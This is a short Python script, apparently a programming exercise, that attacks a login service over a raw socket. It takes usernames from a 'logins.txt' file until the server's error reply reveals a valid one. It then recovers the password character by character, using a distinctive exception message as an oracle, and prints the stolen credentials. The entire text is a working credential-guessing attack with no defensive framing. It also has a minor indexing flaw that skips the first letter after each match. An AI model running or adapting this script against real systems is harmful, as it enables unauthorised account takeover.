import socket
import sys
import json
import string


args = sys.argv
hostname = args[1]
port = int(args[2])
filename = 'logins.txt'
credentials = {}
status = 'pass'
admin_pass = ''
letters = string.ascii_letters + string.digits
l_ix = 0

def login_find():
    with open(filename, 'r') as logins:
        for login in logins:
            yield login.strip("\n")


def response_handling(server_response):
    server_response = server_response.decode("utf-8")
    server_response = json.loads(server_response)
    response_details = server_response['result']
    return response_details


next_login = login_find()
client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)
while status != "Wrong password!":
    credentials['login'] = next(next_login)
    credentials['password'] = ''
    json_credentials = json.dumps(credentials)
    message = json_credentials
    message = message.encode("utf-8")
    client_socket.send(message)
    response = client_socket.recv(1024)
    status = response_handling(response)
while status != 'Connection success!':
    credentials['password'] = admin_pass + letters[l_ix]
    json_credentials = json.dumps(credentials)
    message = json_credentials
    message = message.encode("utf-8")
    client_socket.send(message)
    response = client_socket.recv(1024)
    status = response_handling(response)
    if status == 'Exception happened during login':
        admin_pass = credentials['password']
        l_ix = 0
    l_ix += 1
print(json_credentials)
client_socket.close()
